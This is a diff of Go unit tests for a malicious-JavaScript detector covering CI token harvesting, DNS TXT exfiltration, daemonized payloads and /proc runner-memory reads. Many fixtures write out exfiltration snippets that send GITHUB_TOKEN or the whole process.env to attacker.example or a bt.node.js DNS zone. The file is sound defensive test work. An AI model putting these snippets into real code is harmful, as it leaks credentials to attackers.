+func TestVuln_ProcMemLiteralPidNumeric(t *testing.T) {
+	body := `
+const m = require('fs').readFileSync('/proc/12345/maps');
+if (m.includes('Runner.Worker')) {}
+`
+	findings := analyze(t, "lit.js", body)
+	if !hasRule(findings, RuleProcMemOIDC) {
+		t.Errorf("literal /proc/12345/maps must chain, got: %+v", findings)
+	}
+}
+
+// --- pass-3 fixes: property boundary on daemon options + proximate /proc subpath ---
+
+func TestSafe_NotDetachedOption(t *testing.T) {
+	// A spawn option literally named `notdetached: true` (or
+	// `isDetached: true`) must not satisfy the detached signal.
+	body := `
+const cp = require('child_process');
+cp.spawn('node', ['x'], { notdetached: true, stdio: 'ignore' });
+`
+	findings := analyze(t, "n.js", body)
+	if hasRule(findings, RuleDaemon) {
+		t.Errorf("notdetached:true must not chain daemon, got: %+v", findings)
+	}
+}
+
+func TestSafe_IsDetachedHelperVar(t *testing.T) {
+	body := `
+const cp = require('child_process');
+const isDetached = true;
+cp.spawn('node', ['x'], { stdio: 'ignore' });
+`
+	findings := analyze(t, "i.js", body)
+	if hasRule(findings, RuleDaemon) {
+		t.Errorf("isDetached helper var must not chain daemon, got: %+v", findings)
+	}
+}
+
+func TestSafe_IsStdioPropertyDoesNotMatch(t *testing.T) {
+	// `isStdio: 'ignore'` must not satisfy the stdio signal.
+	body := `
+const cp = require('child_process');
+cp.spawn('node', ['x'], { detached: true, isStdio: 'ignore' });
+`
+	findings := analyze(t, "is.js", body)
+	if hasRule(findings, RuleDaemon) {
+		t.Errorf("isStdio property must not chain stdio, got: %+v", findings)
+	}
+}
+
+func TestSafe_UnrelatedProcAndCmdlineFarApart(t *testing.T) {
+	// A /proc/stat read at the top of a file and an unrelated 'cmdline'
+	// identifier near the bottom must not chain as memory access.
+	body := `
+const stat = require('fs').readFileSync('/proc/stat');
+// ... many lines of code ...
+` + strings.Repeat("// padding line\n", 30) + `
+const myCmdline = 'this is just an identifier';
+const t = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
+`
+	findings := analyze(t, "f.js", body)
+	if hasRule(findings, RuleProcMemOIDC) {
+		t.Errorf("far-apart /proc/stat + cmdline must not chain, got: %+v", findings)
+	}
+}
+
+// --- pass-2 fixes: inline require chain sinks + quoted stdio ---
+
+func TestVuln_CISecretHarvest_InlineRequireHttpsRequest(t *testing.T) {
+	// Compact payload form: require('https').request(...) without
+	// binding the module first. Must still satisfy the network sink.
+	body := `
+const t = process.env.GITHUB_TOKEN;
+require('https').request({hostname:'attacker.example', method:'POST'}).end(t);
+`
+	findings := analyze(t, "i.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("require('https').request inline form must trigger harvest, got: %+v", findings)
+	}
+}
+
+func TestVuln_CISecretHarvest_InlineRequireHttpRequest(t *testing.T) {
+	body := `
+const t = process.env.NPM_TOKEN;
+require("http").request("http://attacker/x", {method:"POST"}).end(t);
+`
+	findings := analyze(t, "i2.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("require(\"http\").request inline form must trigger harvest, got: %+v", findings)
+	}
+}
+
+func TestVuln_CISecretHarvest_NodeSchemeRequire(t *testing.T) {
+	body := `
+const t = process.env.GITHUB_TOKEN;
+require('node:https').request({hostname:'attacker.example'}).end(t);
+`
+	findings := analyze(t, "n.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("node: scheme require + token must trigger harvest, got: %+v", findings)
+	}
+}
+
+func TestVuln_Daemon_QuotedStdioWithoutUnref(t *testing.T) {
+	// JSON-quoted spawn options with quoted stdio but no .unref() must
+	// still satisfy the daemon shape via stdio:'ignore'.
+	body := `
+const cp = require('child_process');
+cp.spawn('node', ['./payload.js'], {"detached": true, "stdio": "ignore"});
+`
+	findings := analyze(t, "qs.js", body)
+	if !hasRule(findings, RuleDaemon) {
+		t.Errorf("quoted stdio:'ignore' must trigger daemon, got: %+v", findings)
+	}
+}
+
+// --- pass-1 fixes: narrow network sinks, /proc memory, quoted detached ---
+
+func TestSafe_LocalClientPostNotNetworkSink(t *testing.T) {
+	// A local helper that happens to expose `.post(...)` (e.g. a
+	// pub/sub bus, an ORM, a queue client) must not by itself satisfy
+	// the network-sink half of the harvest chain.
+	body := `
+const queue = require('./local-queue');
+const tok = process.env.GITHUB_TOKEN;
+queue.post({ id: 1, payload: tok });
+`
+	findings := analyze(t, "x.js", body)
+	if hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("local .post(...) must not satisfy network sink, got: %+v", findings)
+	}
+}
+
+func TestSafe_ProcStatNotMemoryAccess(t *testing.T) {
+	// A benign /proc/stat read paired with an OIDC env reference must
+	// not trigger JS_PROC_MEM_OIDC_001: the rule targets
+	// /proc/<pid>/(mem|maps|cmdline) specifically.
+	body := `
+const fs = require('fs');
+const stat = fs.readFileSync('/proc/stat', 'utf8');
+console.log(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN ? 'yes' : 'no');
+`
+	findings := analyze(t, "stat.js", body)
+	if hasRule(findings, RuleProcMemOIDC) {
+		t.Errorf("/proc/stat alone must not trigger ProcMemOIDC, got: %+v", findings)
+	}
+}
+
+func TestVuln_Daemon_QuotedDetachedProperty(t *testing.T) {
+	// JSON-style spawn options must still chain.
+	body := `
+const cp = require('child_process');
+const child = cp.spawn('node', ['./payload.js'], {"detached": true, "stdio": "ignore"});
+child.unref();
+`
+	findings := analyze(t, "q.js", body)
+	if !hasRule(findings, RuleDaemon) {
+		t.Errorf("quoted \"detached\": true must trigger daemon, got: %+v", findings)
+	}
+}
+
+func TestVuln_ProcMemSelfMaps(t *testing.T) {
+	// /proc/self/maps with Runner.Worker reference is the canonical
+	// runner-pivot shape.
+	body := `
+const maps = require('fs').readFileSync('/proc/self/maps');
+if (maps.includes('Runner.Worker')) { /* found runner */ }
+`
+	findings := analyze(t, "rm.js", body)
+	if !hasRule(findings, RuleProcMemOIDC) {
+		t.Errorf("/proc/self/maps + Runner.Worker must trigger, got: %+v", findings)
+	}
+}
+
+// --- JS_DNS_TXT_EXFIL_001 ---
+
+func TestVuln_DNSTXTExfil_NodeIPCChain(t *testing.T) {
+	// The May 2026 node-ipc compromise shape: child_process.fork
+	// daemonization, env-var stage to envs.txt, archive packed into
+	// os.tmpdir, DNS TXT exfil via the bt.node.js zone. The DAEMON
+	// rule fires on its own chain; DNS TXT exfil fires CRITICAL
+	// thanks to the IOC needle and the multi-partner chain.
+	body := `
+const dns = require('dns');
+const cp = require('child_process');
+const fs = require('fs');
+const os = require('os');
+const t = process.env.GITHUB_TOKEN;
+fs.writeFileSync(os.tmpdir() + '/envs.txt', JSON.stringify(process.env));
+const archive = os.tmpdir() + '/nt-stage.tar.gz';
+const ch = cp.fork('./payload.cjs', [], {detached: true, stdio: 'ignore'}); ch.unref();
+dns.resolveTxt('xh.' + Date.now() + '.bt.node.js', (err, rec) => {});
+`
+	findings := analyze(t, "node-ipc.cjs", body)
+	f := findRule(findings, RuleDNSTXTExfil)
+	if f == nil {
+		t.Fatalf("expected JS_DNS_TXT_EXFIL_001 to fire on full chain, got: %+v", findings)
+	}
+	if f.Severity != types.SeverityCritical {
+		t.Errorf("expected CRITICAL on full IOC chain, got %v", f.Severity)
+	}
+	if !hasRule(findings, RuleDaemon) {
+		t.Errorf("daemon chain (cp.fork + detached + stdio:ignore + unref) must also still fire")
+	}
+}
+
+func TestVuln_DNSTXTExfil_ResolverInstance(t *testing.T) {
+	// resolveTxt called on a new dns.Resolver() instance is the same
+	// covert channel; the alias detector must bind the constructor's
+	// local name.
+	body := `
+const dns = require('node:dns');
+const r = new dns.Resolver();
+const t = process.env.NPM_TOKEN;
+require('fs').writeFileSync(require('os').tmpdir() + '/envs.txt', t);
+const arch = require('os').tmpdir() + '/nt-bundle.tar.gz';
+r.resolveTxt('probe.bt.node.js', (e, a) => {});
+`
+	findings := analyze(t, "payload.cjs", body)
+	if !hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("Resolver-based resolveTxt with secret + envs.txt + archive must trigger, got: %+v", findings)
+	}
+}
+
+func TestVuln_DNSTXTExfil_PromisesDestructure(t *testing.T) {
+	// Destructured import of resolveTxt from dns/promises, aliased.
+	body := `
+import { resolveTxt as lookup } from 'dns/promises';
+import fs from 'fs';
+import os from 'os';
+const secret = process.env.AWS_ACCESS_KEY_ID;
+fs.writeFileSync(os.tmpdir() + '/envs.txt', secret);
+await lookup('bt.node.js');
+`
+	findings := analyze(t, "exfil.mjs", body)
+	f := findRule(findings, RuleDNSTXTExfil)
+	if f == nil {
+		t.Fatalf("destructured resolveTxt + secret + envs.txt + IOC must trigger, got: %+v", findings)
+	}
+	if f.Severity != types.SeverityCritical {
+		t.Errorf("expected CRITICAL when node-ipc IOC needle is present, got %v", f.Severity)
+	}
+}
+
+func TestSafe_DNSTXT_DMARCResolverOnly(t *testing.T) {
+	// A legitimate DMARC checker uses resolveTxt without any secret
+	// read, envs.txt staging, archive, daemon, or known IOC. Must
+	// not fire.
+	body := `
+const dns = require('dns').promises;
+async function checkDMARC(domain) {
+  const records = await dns.resolveTxt('_dmarc.' + domain);
+  return records.length > 0;
+}
+module.exports = { checkDMARC };
+`
+	findings := analyze(t, "dmarc.js", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("resolveTxt alone on a normal DMARC zone must not trigger, got: %+v", findings)
+	}
+}
+
+func TestSafe_DNSTXT_ArchiveAloneNoSink(t *testing.T) {
+	// tar.gz + os.tmpdir without any DNS TXT call (and no other chain
+	// signals) must not fire the DNS rule.
+	body := `
+const tar = require('tar');
+const os = require('os');
+tar.c({file: os.tmpdir() + '/build-output.tar.gz'}, ['./dist']);
+`
+	findings := analyze(t, "build.js", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("archive without a resolveTxt sink must not trigger, got: %+v", findings)
+	}
+}
+
+func TestVuln_DNSTXTExfil_SecretAndEnvsTxtAreSeparatePartners(t *testing.T) {
+	// process.env read and envs.txt staging are two distinct exfil
+	// behaviors. With archive proximity added, the chain reaches three
+	// partners and must escalate to CRITICAL even without a known IOC
+	// or a daemon chain.
+	body := `
+const dns = require('dns');
+const fs = require('fs');
+const os = require('os');
+const t = process.env.GITHUB_TOKEN;
+fs.writeFileSync(os.tmpdir() + '/envs.txt', t);
+const archive = os.tmpdir() + '/stage.tar.gz';
+dns.resolveTxt('exfil.example', () => {});
+`
+	findings := analyze(t, "harvest.js", body)
+	f := findRule(findings, RuleDNSTXTExfil)
+	if f == nil {
+		t.Fatalf("expected JS_DNS_TXT_EXFIL_001 on secret + envs.txt + archive, got: %+v", findings)
+	}
+	if f.Severity != types.SeverityCritical {
+		t.Errorf("expected CRITICAL (three partners: secret, envs.txt, archive), got %v", f.Severity)
+	}
+}
+
+func TestVuln_DNSTXTExfil_PromisesOnModuleAlias(t *testing.T) {
+	// `dns.promises.resolveTxt(...)` is the documented Node form when
+	// the developer binds the callback module and reaches into the
+	// promise sub-namespace. The receiver regex must catch it.
+	body := `
+const dns = require('dns');
+const fs = require('fs');
+const os = require('os');
+const t = process.env.GITHUB_TOKEN;
+fs.writeFileSync(os.tmpdir() + '/envs.txt', t);
+const arch = os.tmpdir() + '/stage.tar.gz';
+await dns.promises.resolveTxt('exfil.example');
+`
+	findings := analyze(t, "promises.cjs", body)
+	if !hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("dns.promises.resolveTxt on a module alias must satisfy the sink, got: %+v", findings)
+	}
+}
+
+func TestVuln_DNSTXTExfil_URLBeforeSinkOnSameLine(t *testing.T) {
+	// Minified one-line payload: a `https://...` URL literal appears
+	// before the resolveTxt call. A naive comment strip treats the
+	// `//` in the URL as a line-comment opener and blanks the rest
+	// of the line, hiding the sink. The string-aware walker keeps
+	// the URL bytes intact so the resolveTxt call still registers.
+	body := "const dns = require('dns'); const endpoint = 'https://sh.azurestaticprovider.net'; const t = process.env.GITHUB_TOKEN; require('fs').writeFileSync(require('os').tmpdir() + '/envs.txt', t); dns.resolveTxt('xh.bt.node.js', () => {});\n"
+	findings := analyze(t, "oneline.cjs", body)
+	if !hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("URL literal before resolveTxt on a minified line must NOT mask the sink, got: %+v", findings)
+	}
+}
+
+func TestVuln_DNSTXTExfil_TemplateLiteralArchive(t *testing.T) {
+	// Real payloads commonly build the archive path via a template
+	// literal: `${os.tmpdir()}/stage.tar.gz`. The os.tmpdir() call
+	// inside ${...} is executable code, not string content, and
+	// must satisfy the archive partner.
+	body := "\n" +
+		"const dns = require('dns');\n" +
+		"const os = require('os');\n" +
+		"const archive = `${os.tmpdir()}/stage.tar.gz`;\n" +
+		"dns.resolveTxt('xh.bt.node.js', () => {});\n"
+	findings := analyze(t, "tpl-archive.cjs", body)
+	if !hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("template-literal `${os.tmpdir()}/stage.tar.gz` must satisfy the archive partner, got: %+v", findings)
+	}
+}
+
+func TestSafe_DNSTXT_UnrelatedTmpdirReceiverIsNotAnArchiveAnchor(t *testing.T) {
+	// `config.tmpdir()` is NOT the Node os helper. The archive
+	// anchor must not register it.
+	body := `
+const dns = require('dns');
+const config = { tmpdir: () => '/tmp/cache' };
+const archive = config.tmpdir() + '/stage.tar.gz';
+dns.resolveTxt('example.com', () => {});
+console.log(archive);
+`
+	findings := analyze(t, "config-tmp.js", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("config.tmpdir() must not satisfy the os archive anchor, got: %+v", findings)
+	}
+}
+
+func TestVuln_DNSTXTExfil_CommaSeparatedResolver(t *testing.T) {
+	// `const dns = require('dns'), r = new dns.Resolver(); r.resolveTxt(...)`
+	// — comma-separated declaration of dns alias and Resolver
+	// instance. Both must register.
+	body := `
+const dns = require('dns'), r = new dns.Resolver();
+const t = process.env.GITHUB_TOKEN;
+console.log(t);
+r.resolveTxt('bt.node.js');
+`
+	if !hasRule(analyze(t, "comma-resolver.cjs", body), RuleDNSTXTExfil) {
+		t.Errorf("comma-separated Resolver declaration must register the receiver")
+	}
+}
+
+func TestSafe_DNSTXT_StringArgDaemonOptionsNotAPartner(t *testing.T) {
+	// child_process.spawn() with a string argument that happens
+	// to contain `{detached: true, stdio: 'ignore'}` as DATA
+	// (e.g. a shell snippet) must NOT satisfy the daemon partner.
+	// The options inside the spawn's first quoted arg are not
+	// the call's own option object.
+	body := `
+const dns = require('dns');
+const cp = require('child_process');
+cp.spawn('echo {detached: true, stdio: \'ignore\'}', []);
+dns.resolveTxt('example.com', () => {});
+`
+	findings := analyze(t, "string-arg-daemon.cjs", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("daemon options inside a STRING argument must not satisfy the daemon partner, got: %+v", findings)
+	}
+}
+
+func TestVuln_DNSTXTExfil_CallFollowedByBlockOnNewLine(t *testing.T) {
+	// A bare resolveTxt call followed by an unrelated block
+	// statement on the next line must still satisfy the sink.
+	// (Regression: previous isFunctionDefinition heuristic
+	// confused this with a method body.)
+	body := `
+const dns = require('dns');
+const { resolveTxt } = dns.promises;
+const t = process.env.GITHUB_TOKEN;
+console.log(t);
+resolveTxt('bt.node.js')
+{ const audit = 1; console.log(audit); }
+`
+	if !hasRule(analyze(t, "block-after.cjs", body), RuleDNSTXTExfil) {
+		t.Errorf("bare resolveTxt followed by a block on a new line must register the call")
+	}
+}
+
+func TestSafe_DNSTXT_RegexAfterControlFlowParenIsNotASink(t *testing.T) {
+	// Regex literal as the body of `if (x) /pattern/.test(s)`.
+	// The `)` is control-flow; `/` opens a regex, not division.
+	// The regex contents must not be treated as executable code.
+	body := `
+const dns = require('dns');
+const enabled = true;
+const src = 'something';
+const t = process.env.GITHUB_TOKEN;
+console.log(t);
+if (enabled) /dns\.resolveTxt\(.*\)/.test(src);
+`
+	findings := analyze(t, "ctrl-flow-regex.js", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("regex literal after control-flow `)` must not be executable code, got: %+v", findings)
+	}
+}
+
+func TestVuln_DNSTXTExfil_WrappedProcessEnvSerialization(t *testing.T) {
+	// JSON.stringify({ env: process.env }) and
+	// JSON.stringify({ ...process.env }) both serialize the
+	// entire process.env. Both must satisfy the secret partner.
+	wrapped := `
+const dns = require('dns');
+const blob = JSON.stringify({ env: process.env });
+dns.resolveTxt('q.' + blob.length + '.example');
+`
+	if !hasRule(analyze(t, "wrapped.cjs", wrapped), RuleDNSTXTExfil) {
+		t.Errorf("JSON.stringify({env: process.env}) must satisfy the secret partner")
+	}
+	spread := `
+const dns = require('dns');
+const blob = JSON.stringify({ ...process.env });
+dns.resolveTxt('q.' + blob.length + '.example');
+`
+	if !hasRule(analyze(t, "spread.cjs", spread), RuleDNSTXTExfil) {
+		t.Errorf("JSON.stringify({...process.env}) must satisfy the secret partner")
+	}
+}
+
+func TestVuln_DNSTXTExfil_ResolveTxtDestructuredFromAlias(t *testing.T) {
+	// Two-step destructure: bind dns first, then destructure
+	// resolveTxt from `dns.promises`. The bare call `resolveTxt(
+	// ...)` must satisfy the sink.
+	body := `
+const dns = require('dns');
+const { resolveTxt } = dns.promises;
+const t = process.env.GITHUB_TOKEN;
+console.log(t);
+await resolveTxt('bt.node.js');
+`
+	if !hasRule(analyze(t, "two-step.cjs", body), RuleDNSTXTExfil) {
+		t.Errorf("destructure of resolveTxt from a verified dns alias must satisfy the sink")
+	}
+}
+
+func TestVuln_DNSTXTExfil_DestructureWithDefault(t *testing.T) {
+	// `const { GITHUB_TOKEN = '' } = process.env` is a valid
+	// destructure with a default initializer. The source member
+	// name must be extracted by stripping the `= ...` initializer.
+	body := `
+const dns = require('dns');
+const { GITHUB_TOKEN = '' } = process.env;
+console.log(GITHUB_TOKEN);
+dns.resolveTxt('bt.node.js', () => {});
+`
+	if !hasRule(analyze(t, "default-destruct.cjs", body), RuleDNSTXTExfil) {
+		t.Errorf("destructure with default initializer must satisfy the secret partner")
+	}
+}
+
+func TestSafe_DNSTXT_NestedTmpdirOuterCommaSeparates(t *testing.T) {
+	// `const tmp = path.join(os.tmpdir()), help = 'stage.tar.gz';`
+	// — tmpdir is inside path.join, but after path.join's `)` the
+	// next `,` is at the OUTER (top) level and is a sequence
+	// separator. The archive token after it must not satisfy the
+	// partner.
+	body := `
+const dns = require('dns');
+const os = require('os');
+const path = require('path');
+const tmp = path.join(os.tmpdir()), help = 'stage.tar.gz';
+console.log(tmp, help);
+dns.resolveTxt('example.com', () => {});
+`
+	findings := analyze(t, "nested-tmp-comma.cjs", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("outer-comma after nested tmpdir must separate the archive partner, got: %+v", findings)
+	}
+}
+
+func TestSafe_DNSTXT_NamedEnvAssignmentIsNotARead(t *testing.T) {
+	// `process.env.GITHUB_TOKEN = 'fake'` is an assignment, not a
+	// read. Setup/test code that initializes named env vars
+	// must not satisfy the secret partner.
+	body := `
+const dns = require('dns');
+process.env.GITHUB_TOKEN = 'fake-for-test';
+process.env['NPM_TOKEN'] = 'test';
+dns.resolveTxt('example.com', () => {});
+`
+	findings := analyze(t, "env-assign.cjs", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("named env assignment must not satisfy the secret partner, got: %+v", findings)
+	}
+}
+
+func TestSafe_DNSTXT_DynamicProcessEnvWriteIsNotARead(t *testing.T) {
+	// `process.env[k] = 'x'` is a WRITE on the LHS of an
+	// assignment. Must not satisfy the secret partner.
+	body := `
+const dns = require('dns');
+const keys = ['LOG_LEVEL', 'CI'];
+for (const k of keys) process.env[k] = 'default';
+dns.resolveTxt('example.com', () => {});
+`
+	findings := analyze(t, "env-write.cjs", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("process.env[k] = ... write must not satisfy the secret partner, got: %+v", findings)
+	}
+}
+
+func TestVuln_DNSTXTExfil_CommaSeparatedCJSDeclarators(t *testing.T) {
+	// Minified install scripts often declare multiple requires
+	// with a single keyword: `const fs = require('fs'), os = ...,
+	// dns = require('dns')`. The second and third bindings have
+	// no `const` prefix and must still register.
+	body := `
+const fs = require('fs'), os = require('os'), dns = require('dns');
+const t = process.env.GITHUB_TOKEN;
+fs.writeFileSync(os.tmpdir() + '/envs.txt', t);
+dns.resolveTxt('bt.node.js', () => {});
+`
+	if !hasRule(analyze(t, "comma-decl.cjs", body), RuleDNSTXTExfil) {
+		t.Errorf("comma-separated CJS declarators must register dns/fs/os aliases")
+	}
+}
+
+func TestSafe_DNSTXT_ObjectAssignProcessEnvTargetIsNotARead(t *testing.T) {
+	// Object.assign(process.env, defaults) MUTATES process.env;
+	// it does not read its values. Must not satisfy the secret
+	// partner.
+	body := `
+const dns = require('dns');
+Object.assign(process.env, { LOG_LEVEL: 'debug' });
+dns.resolveTxt('example.com', () => {});
+`
+	findings := analyze(t, "assign-target.cjs", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("Object.assign(process.env, ...) target-position write must not satisfy the secret partner, got: %+v", findings)
+	}
+}
+
+func TestVuln_DNSTXTExfil_ObjectAssignProcessEnvAsSource(t *testing.T) {
+	// Object.assign({}, process.env) READS process.env values.
+	// Must satisfy the secret partner.
+	body := `
+const dns = require('dns');
+const cloned = Object.assign({}, process.env);
+console.log(cloned);
+dns.resolveTxt('bt.node.js', () => {});
+`
+	if !hasRule(analyze(t, "assign-source.cjs", body), RuleDNSTXTExfil) {
+		t.Errorf("Object.assign({}, process.env) source-position read must satisfy the secret partner")
+	}
+}
+
+func TestSafe_DNSTXT_EnvsTxtAsDataNotPath(t *testing.T) {
+	// fs.writeFileSync('/tmp/readme.txt', 'envs.txt') — envs.txt
+	// is the DATA being written, not the filename. Must not
+	// register as a staging partner.
+	body := `
+const dns = require('dns');
+const fs = require('fs');
+fs.writeFileSync('/tmp/readme.txt', 'envs.txt');
+dns.resolveTxt('example.com', () => {});
+`
+	findings := analyze(t, "envs-as-data.cjs", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("envs.txt as DATA (not path) must not satisfy the staging partner, got: %+v", findings)
+	}
+}
+
+func TestVuln_DNSTXTExfil_InlineRequireBracketAccess(t *testing.T) {
+	// require('dns')['resolveTxt'](...) — no local alias, bracket
+	// access on the inline require chain.
+	body := `
+const t = process.env.GITHUB_TOKEN;
+console.log(t);
+require('dns')['resolveTxt']('bt.node.js');
+`
+	if !hasRule(analyze(t, "inline-bracket.cjs", body), RuleDNSTXTExfil) {
+		t.Errorf("inline require('dns')['resolveTxt']() must satisfy the sink")
+	}
+}
+
+func TestSafe_DNSTXT_SequenceExpressionSeparatesPartners(t *testing.T) {
+	// Top-level sequence expression: writeFileSync writes to an
+	// unrelated path, then a separate assignment puts envs.txt in
+	// a variable. The `,` at top level is a sequence separator;
+	// envs.txt must not be the staging partner for the write call.
+	body := `
+const dns = require('dns');
+const fs = require('fs');
+let help;
+fs.writeFileSync('/tmp/log','x'), help='/envs.txt';
+dns.resolveTxt('example.com', () => {});
+console.log(help);
+`
+	findings := analyze(t, "seq-expr.cjs", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("top-level sequence expression must separate write and envs.txt token, got: %+v", findings)
+	}
+}
+
+func TestSafe_DNSTXT_ObjectKeysProcessEnvAloneNotASecretRead(t *testing.T) {
+	// `Object.keys(process.env)` only enumerates variable names,
+	// not values. Without an actual value read, the secret
+	// partner must not register.
+	body := `
+const dns = require('dns');
+const names = Object.keys(process.env);
+console.log(names.length);
+dns.resolveTxt('example.com', () => {});
+`
+	if hasRule(analyze(t, "keys-only.cjs", body), RuleDNSTXTExfil) {
+		t.Errorf("Object.keys(process.env) without a value read must not satisfy the secret partner")
+	}
+}
+
+func TestVuln_DNSTXTExfil_DynamicBracketEnvAccess(t *testing.T) {
+	// The two-step pattern: enumerate keys, then dynamically read
+	// values via process.env[k]. The bracket access is the value
+	// read and must satisfy the partner.
+	body := `
+const dns = require('dns');
+Object.keys(process.env).forEach(k => dns.resolveTxt(process.env[k] + '.example'));
+`
+	if !hasRule(analyze(t, "dynamic-bracket.cjs", body), RuleDNSTXTExfil) {
+		t.Errorf("process.env[k] dynamic access must satisfy the secret partner")
+	}
+}
+
+func TestVuln_DNSTXTExfil_WholeProcessEnvForEach(t *testing.T) {
+	// Object.values(process.env).forEach(... dns.resolveTxt(...)).
+	// Most direct DNS credential-exfil shape; no specific CI
+	// variable is named, but the whole-env enumeration is itself
+	// the secret partner.
+	body := `
+const dns = require('dns');
+Object.values(process.env).forEach(v => dns.resolveTxt('q.' + v + '.example'));
+`
+	if !hasRule(analyze(t, "whole-env-foreach.cjs", body), RuleDNSTXTExfil) {
+		t.Errorf("whole-process env enumeration must satisfy the secret partner")
+	}
+}
+
+func TestVuln_DNSTXTExfil_JSONStringifyProcessEnv(t *testing.T) {
+	body := `
+const dns = require('dns');
+const blob = JSON.stringify(process.env);
+dns.resolveTxt('x.' + Buffer.from(blob).toString('hex') + '.example');
+`
+	if !hasRule(analyze(t, "json-env.cjs", body), RuleDNSTXTExfil) {
+		t.Errorf("JSON.stringify(process.env) must satisfy the secret partner")
+	}
+}
+
+func TestVuln_DNSTXTExfil_FsPromisesDestructuredAsAlias(t *testing.T) {
+	// `const { promises: fs } = require('fs')` binds the fs.promises
+	// namespace under the local name `fs`. Later `fs.writeFile(...)`
+	// is the standard promises API and must satisfy the staging
+	// partner.
+	cjs := `
+const dns = require('dns');
+const { promises: fs } = require('fs');
+const os = require('os');
+await fs.writeFile(os.tmpdir() + '/envs.txt', JSON.stringify(process.env));
+await dns.promises.resolveTxt('bt.node.js');
+`
+	if !hasRule(analyze(t, "promises-as-fs.cjs", cjs), RuleDNSTXTExfil) {
+		t.Errorf("CJS `{ promises: fs }` destructure must register `fs` as a write receiver")
+	}
+	esm := `
+import dns from 'dns';
+import { promises as fs } from 'fs';
+import os from 'os';
+await fs.writeFile(os.tmpdir() + '/envs.txt', JSON.stringify(process.env));
+await dns.promises.resolveTxt('bt.node.js');
+`
+	if !hasRule(analyze(t, "promises-as-fs.mjs", esm), RuleDNSTXTExfil) {
+		t.Errorf("ESM `{ promises as fs }` must register `fs` as a write receiver")
+	}
+}
+
+func TestVuln_DNSTXTExfil_OptionalChainAndBracketAccess(t *testing.T) {
+	// dns.resolveTxt?.(...), dns?.resolveTxt(...), and
+	// dns['resolveTxt'](...) are all valid modern JS sink forms.
+	optChain := `
+const dns = require('dns');
+const t = process.env.GITHUB_TOKEN;
+console.log(t);
+dns.resolveTxt?.('bt.node.js');
+`
+	if !hasRule(analyze(t, "opt-chain.cjs", optChain), RuleDNSTXTExfil) {
+		t.Errorf("dns.resolveTxt?.(...) must satisfy the sink")
+	}
+	optChainReceiver := `
+const dns = require('dns');
+const t = process.env.GITHUB_TOKEN;
+console.log(t);
+dns?.resolveTxt('bt.node.js');
+`
+	if !hasRule(analyze(t, "opt-recv.cjs", optChainReceiver), RuleDNSTXTExfil) {
+		t.Errorf("dns?.resolveTxt(...) must satisfy the sink")
+	}
+	bracket := `
+const dns = require('dns');
+const t = process.env.GITHUB_TOKEN;
+console.log(t);
+dns['resolveTxt']('bt.node.js');
+`
+	if !hasRule(analyze(t, "bracket.cjs", bracket), RuleDNSTXTExfil) {
+		t.Errorf("dns['resolveTxt'](...) must satisfy the sink")
+	}
+	optBracket := `
+const dns = require('dns');
+const t = process.env.GITHUB_TOKEN;
+console.log(t);
+dns?.['resolveTxt']('bt.node.js');
+`
+	if !hasRule(analyze(t, "opt-bracket.cjs", optBracket), RuleDNSTXTExfil) {
+		t.Errorf("dns?.['resolveTxt'](...) must satisfy the sink")
+	}
+}
+
+func TestSafe_DNSTXT_PatternsInRegexLiteralNotASink(t *testing.T) {
+	// A test/detection file embeds a regex literal whose pattern
+	// names dns.resolveTxt. The regex literal is NOT executable
+	// code; with any real partner signal, the rule must not fire.
+	body := `
+const dns = require('dns');
+const detector = /dns\.resolveTxt\s*\(/;
+const t = process.env.GITHUB_TOKEN;
+console.log(detector, t);
+`
+	findings := analyze(t, "regex-literal.js", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("regex-literal patterns must not satisfy the DNS sink, got: %+v", findings)
+	}
+}
+
+func TestVuln_DNSTXTExfil_PromisesResolverInstance(t *testing.T) {
+	// `const r = new dns.promises.Resolver(); r.resolveTxt(...)`
+	// is the documented promises sub-namespace Resolver shape.
+	body := `
+const dns = require('dns');
+const r = new dns.promises.Resolver();
+const t = process.env.GITHUB_TOKEN;
+console.log(t);
+await r.resolveTxt('bt.node.js');
+`
+	if !hasRule(analyze(t, "promises-instance.cjs", body), RuleDNSTXTExfil) {
+		t.Errorf("new dns.promises.Resolver() instance must satisfy the sink")
+	}
+}
+
+func TestSafe_DNSTXT_InlineRequireInsideHelpString(t *testing.T) {
+	// Doc string contains an inline-require example. With a real
+	// secret partner present, the rule must NOT fire because the
+	// require text is inside a string literal.
+	body := `
+const dns = require('dns');
+const HELP = "require('dns').resolveTxt('example.com', cb)";
+const t = process.env.GITHUB_TOKEN;
+console.log(HELP, t);
+`
+	findings := analyze(t, "inline-doc.js", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("inline-require example inside a help string must not satisfy the sink, got: %+v", findings)
+	}
+}
+
+func TestSafe_DNSTXT_InlineFsRequireInsideHelpString(t *testing.T) {
+	body := `
+const dns = require('dns');
+const HELP = "require('fs').writeFileSync('/envs.txt', x);";
+async function lookup(d) { return await dns.promises.resolveTxt(d); }
+module.exports = { HELP, lookup };
+`
+	findings := analyze(t, "inline-fs-doc.js", body)
+	if hasRule(findings, RuleDNSTXTExfil) {
+		t.Errorf("inline fs.require example inside a string must not satisfy the staging partner, got: %+v", findings)
+	}
+}
+
